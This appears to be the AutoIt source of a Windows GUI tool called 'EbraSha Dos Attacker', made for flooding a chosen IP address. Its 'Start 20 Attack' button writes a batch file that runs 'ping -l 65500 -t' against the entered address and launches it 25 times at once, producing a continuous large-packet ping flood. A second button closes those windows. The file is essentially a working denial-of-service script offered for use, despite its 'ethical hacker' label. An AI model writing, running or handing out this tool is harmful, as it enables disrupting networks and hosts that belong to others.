#RequireAdmin
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Version=Beta
#AutoIt3Wrapper_Icon=..\Source Design\Terminator-emoticon.ico
#AutoIt3Wrapper_Compression=4
#AutoIt3Wrapper_Res_Comment=www.EbraSha.ir
#AutoIt3Wrapper_Res_Description=Create By EbraSha
#AutoIt3Wrapper_Res_Fileversion=1.0.0.3
#AutoIt3Wrapper_Res_Fileversion_AutoIncrement=y
#AutoIt3Wrapper_Res_requestedExecutionLevel=requireAdministrator
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#cs ----------------------------------------------------------------------------

 AutoIt Version: 3.3.8.1
 Author:         EbraSha

#ce ----------------------------------------------------------------------------


#include <IE.au3>
#include <ButtonConstants.au3>
#include <GUIConstantsEx.au3>
#include <StaticConstants.au3>
#include <WindowsConstants.au3>
$MainForm = GUICreate("EbraSha Dos Attacker Ver 1.0 For Ethical Hacker's", 513,80) ; Show  Main Form
$ipbox = GUICtrlCreateInput("",98,30,156,25) ; Get IP
; Value For Bat File
$title = '@title EbraSha-Dos-Attacker'
$color = '@color a'
$prompt = '@Prompt EbraSha-Dos-Attacker = '
$pingst = ' -l 65500 -t' ; Ping Size Paket & Ping Time
$ping = 'ping '
; Lable & Button
$labClick = GUICtrlCreateLabel("Ip Address : ",28, 35, 70, 17)
$programmer = GUICtrlCreateLabel("About Programmer ",206, 65, 100, 17)
$attack = GUICtrlCreateButton("Start 20 Attack", 263, 30, 100, 25)
$terminatcmd = GUICtrlCreateButton("Terminate 20 Attack", 370, 30, 120, 25)  ;======> Terminate 20 Process



;$bg = GUICtrlCreatePic("Top.jpg", 0 ,0,513,30)
GUISetState()

WinSetTrans("Click Master PRO", '', 200)



While 1
    $nMsg = GUIGetMsg()
    Switch $nMsg
        case $programmer
            MsgBox(0, "Programmer", "Email : Info@Ebrasha.ir ||| Web Site : Www.EbraSha.ir", 7)
        case $attack
			$batfile = FileOpen(@ScriptDir & "\EbraSha-Dos-Attacker.bat",2); Create Bat File
			Sleep(2000)
			FileWrite($batfile,$prompt & @CRLF)
			FileWrite($batfile,$title & @CRLF)
			FileWrite($batfile,$color & @CRLF)
			FileWrite($batfile , $ping &""&  GUICtrlRead($ipbox) & $pingst )
			FileClose($batfile)
			Run(@ScriptDir & "\EbraSha-Dos-Attacker.bat")
			Run(@ScriptDir & "\EbraSha-Dos-Attacker.bat")
			Run(@ScriptDir & "\EbraSha-Dos-Attacker.bat")
			Run(@ScriptDir & "\EbraSha-Dos-Attacker.bat")
			Run(@ScriptDir & "\EbraSha-Dos-Attacker.bat")
						Run(@ScriptDir & "\EbraSha-Dos-Attacker.bat")
			Run(@ScriptDir & "\EbraSha-Dos-Attacker.bat")
			Run(@ScriptDir & "\EbraSha-Dos-Attacker.bat")
			Run(@ScriptDir & "\EbraSha-Dos-Attacker.bat")
			Run(@ScriptDir & "\EbraSha-Dos-Attacker.bat")
						Run(@ScriptDir & "\EbraSha-Dos-Attacker.bat")
			Run(@ScriptDir & "\EbraSha-Dos-Attacker.bat")
			Run(@ScriptDir & "\EbraSha-Dos-Attacker.bat")
			Run(@ScriptDir & "\EbraSha-Dos-Attacker.bat")
			Run(@ScriptDir & "\EbraSha-Dos-Attacker.bat")
						Run(@ScriptDir & "\EbraSha-Dos-Attacker.bat")
			Run(@ScriptDir & "\EbraSha-Dos-Attacker.bat")
			Run(@ScriptDir & "\EbraSha-Dos-Attacker.bat")
			Run(@ScriptDir & "\EbraSha-Dos-Attacker.bat")
			Run(@ScriptDir & "\EbraSha-Dos-Attacker.bat")
						Run(@ScriptDir & "\EbraSha-Dos-Attacker.bat")
			Run(@ScriptDir & "\EbraSha-Dos-Attacker.bat")
			Run(@ScriptDir & "\EbraSha-Dos-Attacker.bat")
			Run(@ScriptDir & "\EbraSha-Dos-Attacker.bat")
			Run(@ScriptDir & "\EbraSha-Dos-Attacker.bat")


		case $terminatcmd
				WinClose("Administrator:  EbraSha-Dos-Attacker")
				WinClose("Administrator:  EbraSha-Dos-Attacker")
				WinClose("Administrator:  EbraSha-Dos-Attacker")
				WinClose("Administrator:  EbraSha-Dos-Attacker")
				WinClose("Administrator:  EbraSha-Dos-Attacker")
				;5 Proc
								WinClose("Administrator:  EbraSha-Dos-Attacker")
				WinClose("Administrator:  EbraSha-Dos-Attacker")
				WinClose("Administrator:  EbraSha-Dos-Attacker")
				WinClose("Administrator:  EbraSha-Dos-Attacker")
				WinClose("Administrator:  EbraSha-Dos-Attacker")
				;5 Proc
								WinClose("Administrator:  EbraSha-Dos-Attacker")
				WinClose("Administrator:  EbraSha-Dos-Attacker")
				WinClose("Administrator:  EbraSha-Dos-Attacker")
				WinClose("Administrator:  EbraSha-Dos-Attacker")
				WinClose("Administrator:  EbraSha-Dos-Attacker")
				;5 Proc
								WinClose("Administrator:  EbraSha-Dos-Attacker")
				WinClose("Administrator:  EbraSha-Dos-Attacker")
				WinClose("Administrator:  EbraSha-Dos-Attacker")
				WinClose("Administrator:  EbraSha-Dos-Attacker")
				WinClose("Administrator:  EbraSha-Dos-Attacker")
				;5 Proc
								WinClose("Administrator:  EbraSha-Dos-Attacker")
				WinClose("Administrator:  EbraSha-Dos-Attacker")
				WinClose("Administrator:  EbraSha-Dos-Attacker")
				WinClose("Administrator:  EbraSha-Dos-Attacker")
				WinClose("Administrator:  EbraSha-Dos-Attacker")
				;5 Proc

        Case $GUI_EVENT_CLOSE



            Exit

    EndSwitch
WEnd
